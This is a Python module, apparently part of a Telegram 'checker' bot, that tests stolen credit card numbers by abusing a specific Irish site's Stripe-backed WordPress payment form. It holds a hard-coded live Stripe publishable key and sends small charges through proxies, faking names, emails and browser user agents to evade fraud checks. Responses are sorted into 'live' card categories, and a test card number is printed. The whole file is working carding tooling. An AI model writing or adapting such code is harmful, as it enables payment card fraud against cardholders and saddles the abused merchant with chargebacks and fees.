# gatet2.py - Torr.ie Stripe Gateway
# Used by: /v2 (mass 0.7-1.4$)
# Compatible with: bot.py (check_single_card, classify_response, proxies support)

import requests
import time
import random
import uuid
from faker import Faker

fake = Faker("en_US")

# ========== CLASSIFICATION KEYS ==========
success_keys = [
    "appreciate", "appreciated", "Payment Success", "redirect_to", 
    "thank", "Thanks", "Gracias", "Thank", "redirectUrl", "succeeded", 
    "confirmation", "Successful!", "Thanks!", "Successful", "hide_form", 
    "redirect_url", "Merci", "Form entry saved", "Success!"
]

ccn_keys = [
    "security code is incorrect", 
    "INCORRECT_CVV"
]

cvv_keys = [
    "transaction_not_allowed", 
    "Your card does not support this type of purchase", 
    "do_not_honor"
]

insufficient_keys = [
    "Your card has insufficient funds.", 
    "INSUFFICIENT_FUNDS", 
    "insufficient_funds", 
    "Insufficient Funds", 
    "Insufficient"
]

expired_keys = [
    "card has expired"
]

declined_keys = [
    "cannot be processed", 
    "CARD_DECLINED", 
    "Your card was declined.", 
    "generic_decline", 
    "cannot process your order"
]

otp_keys = [
    "Verifying", "action_required", "verifying", "call_next_method", 
    "requires_source_action", "CompletePaymentChallenge", "requires_action", 
    "additional action before completion!", "nextAction"
]

invalid_keys = ["Invalid account"]
payment_failed_keys = ["does not match the billing address"]
incorrect_keys = ["card number is incorrect"]
manycc_keys = ["Too Many Requests"]
riskcc_keys = ["again in a little bit"]
cap_keys = ["reCaptcha"]
exceed_keys = ["exceeding its amount limit"]
proxyfailed_keys = ["Failed to perform"]


def classify_response(last):
    """
    Classify gateway response.
    bot.py က ဒီ function ကို တိုက်ရိုက်ခေါ်ပါတယ်။
    
    Args:
        last: response text from gateway
        
    Returns:
        tuple: (status_code, detail_message)
            status_code: HIT, CCN, CVV, 3DS, INSUFFICIENT, EXPIRED, DEAD
            detail_message: User-friendly status message
    """
    if not last:
        return "DEAD", "DECLINED - No Response ❌"
    
    last_lower = last.lower()
    
    # Check success first
    if any(key.lower() in last_lower for key in success_keys):
        return "HIT", "HIT - Payment Approved ✅"
    
    # Check CCN (live card, wrong CVV)
    if any(key.lower() in last_lower for key in ccn_keys):
        return "CCN", "CCN LIVE - Security Code Incorrect ✅"
    
    # Check CVV (live card, transaction not allowed)
    if any(key.lower() in last_lower for key in cvv_keys):
        return "CVV", "CVV LIVE - Transaction Not Allowed ✅"
    
    # Check 3DS/OTP
    if any(key.lower() in last_lower for key in otp_keys):
        return "3DS", "3DS REQUIRED - Authentication Needed 🔐"
    
    # Check insufficient funds
    if any(key.lower() in last_lower for key in insufficient_keys):
        return "INSUFFICIENT", "INSUFFICIENT FUNDS - Low Balance 💰"
    
    # Check expired
    if any(key.lower() in last_lower for key in expired_keys):
        return "EXPIRED", "EXPIRED - Card Expired 📅"
    
    # Check declined
    if any(key.lower() in last_lower for key in declined_keys):
        return "DEAD", "DECLINED - Transaction Declined ❌"
    
    # Check invalid card number
    if any(key.lower() in last_lower for key in incorrect_keys):
        return "DEAD", "DECLINED - Invalid Card Number ❌"
    
    # Check rate limit
    if any(key.lower() in last_lower for key in manycc_keys):
        return "DEAD", "DECLINED - Too Many Requests ⚠️"
    
    # Check risk
    if any(key.lower() in last_lower for key in riskcc_keys):
        return "DEAD", "DECLINED - Risk Detected ⚠️"
    
    # Check captcha
    if any(key.lower() in last_lower for key in cap_keys):
        return "DEAD", "DECLINED - Captcha Required ⚠️"
    
    # Check exceed limit
    if any(key.lower() in last_lower for key in exceed_keys):
        return "INSUFFICIENT", "INSUFFICIENT - Amount Limit Exceeded 💰"
    
    # Check proxy failed
    if any(key.lower() in last_lower for key in proxyfailed_keys):
        return "ERROR", "NETWORK ERROR - Proxy Failed ⚠️"
    
    # Default: return DEAD with original response snippet
    return "DEAD", f"DECLINED - {last[:60]} ❌"


# ========== HELPER FUNCTIONS ==========

def gen_random_user_agent():
    """Generate random User-Agent string"""
    chrome_version = random.randint(120, 137)
    user_agents = [
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36 Edg/{chrome_version}.0.0.0",
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
        f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Mobile Safari/537.36",
        f"Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Mobile Safari/537.36",
        f"Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Mobile Safari/537.36",
        f"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
        f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
        f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
    ]
    return random.choice(user_agents)


def gen_random_name():
    """Generate random first and last name"""
    first_name = fake.first_name()
    last_name = fake.last_name()
    return first_name, last_name


def gen_random_email(first_name, last_name):
    """Generate random email address"""
    domains = ["@gmail.com", "@hotmail.com", "@outlook.com", "@yahoo.com", "@protonmail.com"]
    random_num = random.randint(1000, 99999)
    email = f"{first_name.lower()}{random_num}{random.choice(domains)}"
    return email


def gen_random_guid():
    """Generate random GUID for Stripe"""
    return f"{uuid.uuid4()}{random.randint(10000, 99999)}"


# ========== MAIN TELE FUNCTION ==========

def Tele(ccx: str, amount: str = "0.70", proxies=None):
    """
    Check credit card via torr.ie Stripe Gateway.
    
    Args:
        ccx: Card string in format "card_number|month|year|cvv"
        amount: Charge amount (default: "0.70")
        proxies: Optional proxy dict e.g. {'http': 'http://ip:port', 'https': 'http://ip:port'}
        
    Returns:
        tuple: (response_message, gateway_name)
            response_message: Human-readable result
            gateway_name: Gate identifier for display
    """
    
    # ===== PARSE CARD DETAILS =====
    ccx = ccx.strip()
    parts = ccx.split("|")
    
    if len(parts) != 4:
        return "ERROR: Invalid format - use cc|mm|yy|cvv", "Gate 2"
    
    n, mm, yy, cvc = parts
    
    # Clean card number (remove spaces/dashes)
    n = n.replace(" ", "").replace("-", "")
    
    # Validate card number length
    if len(n) < 13 or len(n) > 19:
        return "ERROR: Invalid card number length", "Gate 2"
    
    # Fix month format (1 -> 01)
    mm = mm.strip().zfill(2)
    
    # Fix year format (2026 -> 26)
    yy = yy.strip()
    if len(yy) == 4 and yy.startswith("20"):
        yy = yy[2:4]
    
    # Validate month
    try:
        month_int = int(mm)
        if month_int < 1 or month_int > 12:
            return "ERROR: Invalid month", "Gate 2"
    except:
        return "ERROR: Invalid month format", "Gate 2"
    
    charge_amount = str(amount)
    gateway_name = f"Gate 2 ${charge_amount}"
    
    # ===== GENERATE RANDOM CUSTOMER DATA =====
    first_name, last_name = gen_random_name()
    email = gen_random_email(first_name, last_name)
    full_name = f"{first_name} {last_name}"
    
    # ===== GENERATE STRIPE IDs =====
    guid = gen_random_guid()
    muid = gen_random_guid()
    sid = gen_random_guid()
    client_session_id = gen_random_guid()
    
    # ===== STRIPE PUBLISHABLE KEY =====
    stripe_key = "pk_live_51JVKouAs6DndN9b8mx4e9zfXHN3jWXh6L0V2n3xk59hs90Nqy9RuqM2nqdjQkKPOB5DwBgoe9poeThAhanhLNPi900zHJa87Tz"
    
    # ===== CREATE SESSION =====
    session = requests.Session()
    
    # Apply proxies if provided
    if proxies:
        session.proxies.update(proxies)
    
    # Set cookies
    session.cookies.set('__stripe_mid', muid)
    session.cookies.set('__stripe_sid', sid)
    session.cookies.set('_ga', f'GA1.1.{random.randint(1000000, 9999999)}.{int(time.time())}')
    session.cookies.set('_gcl_au', f'1.1.{random.randint(100000000, 999999999)}.{int(time.time())}')
    
    # ===== STEP 1: CREATE PAYMENT METHOD =====
    url_stripe = "https://api.stripe.com/v1/payment_methods"
    
    # Build form data
    stripe_data = (
        f'type=card'
        f'&billing_details[name]={requests.utils.quote(full_name)}'
        f'&card[number]={n}'
        f'&card[cvc]={cvc}'
        f'&card[exp_month]={mm}'
        f'&card[exp_year]={yy}'
        f'&guid={guid}'
        f'&muid={muid}'
        f'&sid={sid}'
        f'&pasted_fields=number'
        f'&payment_user_agent=stripe.js%2F922d612e68%3B+stripe-js-v3%2F922d612e68%3B+card-element'
        f'&referrer=https%3A%2F%2Ftorr.ie'
        f'&time_on_page={random.randint(10000, 50000)}'
        f'&client_attribution_metadata[client_session_id]={client_session_id}'
        f'&client_attribution_metadata[merchant_integration_source]=elements'
        f'&client_attribution_metadata[merchant_integration_subtype]=card-element'
        f'&client_attribution_metadata[merchant_integration_version]=2017'
        f'&key={stripe_key}'
    )
    
    headers_stripe = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': gen_random_user_agent(),
    }
    
    # Send request
    try:
        response = session.post(url_stripe, headers=headers_stripe, data=stripe_data, timeout=30)
    except requests.exceptions.Timeout:
        return "NETWORK ERROR: Request Timeout ⚠️", gateway_name
    except requests.exceptions.ConnectionError:
        return "NETWORK ERROR: Connection Failed ⚠️", gateway_name
    except requests.exceptions.ProxyError:
        return "NETWORK ERROR: Proxy Failed ⚠️", gateway_name
    except requests.exceptions.RequestException as e:
        return f"NETWORK ERROR: {str(e)[:80]}", gateway_name
    
    # ===== HANDLE STRIPE API RESPONSE =====
    if response.status_code != 200:
        try:
            error_json = response.json()
            error_msg = error_json.get('error', {}).get('message', response.text[:200])
        except:
            error_msg = response.text[:200]
        
        error_lower = str(error_msg).lower()
        
        # Classify Stripe error
        if any(k in error_lower for k in ['incorrect', 'invalid']) and 'number' in error_lower:
            return "DECLINED - Invalid Card Number ❌", gateway_name
        if any(k in error_lower for k in ['cvc', 'cvv', 'security code']):
            return "CCN LIVE - Security Code Incorrect ✅", gateway_name
        if 'expired' in error_lower:
            return "EXPIRED - Card Expired 📅", gateway_name
        if 'insufficient' in error_lower:
            return "INSUFFICIENT FUNDS - Low Balance 💰", gateway_name
        if 'declined' in error_lower:
            return "DECLINED - Card Declined ❌", gateway_name
        if 'do_not_honor' in error_lower:
            return "CVV LIVE - Do Not Honor ✅", gateway_name
        
        return f"DECLINED - {error_msg[:60]}", gateway_name
    
    # ===== PARSE PAYMENT METHOD ID =====
    try:
        response_json = response.json()
        if 'id' not in response_json:
            return "ERROR: No Payment Method ID returned", gateway_name
        payment_method_id = response_json['id']
    except Exception as e:
        return f"ERROR: Failed to parse response - {str(e)[:50]}", gateway_name
    
    # ===== STEP 2: CHARGE VIA WORDPRESS AJAX =====
    url_wp = "https://torr.ie/wp-admin/admin-ajax.php"
    
    wp_data = {
        'action': 'wp_full_stripe_inline_payment_charge',
        'wpfs-form-name': 'default',
        'wpfs-form-get-parameters': '{}',
        'wpfs-custom-amount-unique': charge_amount,
        'wpfs-custom-input[]': str(random.randint(10000, 99999)),
        'wpfs-card-holder-email': email,
        'wpfs-card-holder-name': full_name,
        'wpfs-stripe-payment-method-id': payment_method_id,
    }
    
    headers_wp = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://torr.ie',
        'Referer': 'https://torr.ie/payments/',
        'User-Agent': gen_random_user_agent(),
        'X-Requested-With': 'XMLHttpRequest',
    }
    
    # Send charge request
    try:
        r2 = session.post(url_wp, data=wp_data, headers=headers_wp, timeout=30)
    except requests.exceptions.Timeout:
        return "NETWORK ERROR: Charge Timeout ⚠️", gateway_name
    except requests.exceptions.ConnectionError:
        return "NETWORK ERROR: Charge Connection Failed ⚠️", gateway_name
    except requests.exceptions.ProxyError:
        return "NETWORK ERROR: Proxy Failed on Charge ⚠️", gateway_name
    except requests.exceptions.RequestException as e:
        return f"NETWORK ERROR: {str(e)[:80]}", gateway_name
    
    # ===== PARSE CHARGE RESPONSE =====
    try:
        response_json = r2.json()
        message = response_json.get('message', r2.text)
    except:
        message = r2.text
    
    # Classify final response
    status, detail = classify_response(message)
    
    return detail, gateway_name


# ========== TEST ==========
if __name__ == "__main__":
    print("=" * 60)
    print("🔥 Gate 2 - Torr.ie Stripe Checker")
    print("=" * 60)
    print(f"✅ classify_response: Available")
    print(f"✅ Tele(cc, amount, proxies): Available")
    print("=" * 60)
    
    # Test card
    test_card = "4815821145363426|09|29|767"
    test_amount = "0.70"
    
    print(f"\n[+] Testing Card: {test_card}")
    print(f"[+] Amount: ${test_amount}")
    print("-" * 60)
    
    result, gateway = Tele(test_card, test_amount)
    print(f"\n📊 Result: {result}")
    print(f"🚪 Gateway: {gateway}")
    
    # Test classify_response
    print("\n" + "=" * 60)
    print("📝 Testing classify_response:")
    test_responses = [
        "Payment successful!",
        "security code is incorrect",
        "do_not_honor",
        "insufficient_funds",
        "card has expired",
    ]
    for resp in test_responses:
        sc, detail = classify_response(resp)
        print(f"  '{resp[:40]}...' -> {sc}: {detail}")
    
    print("=" * 60)
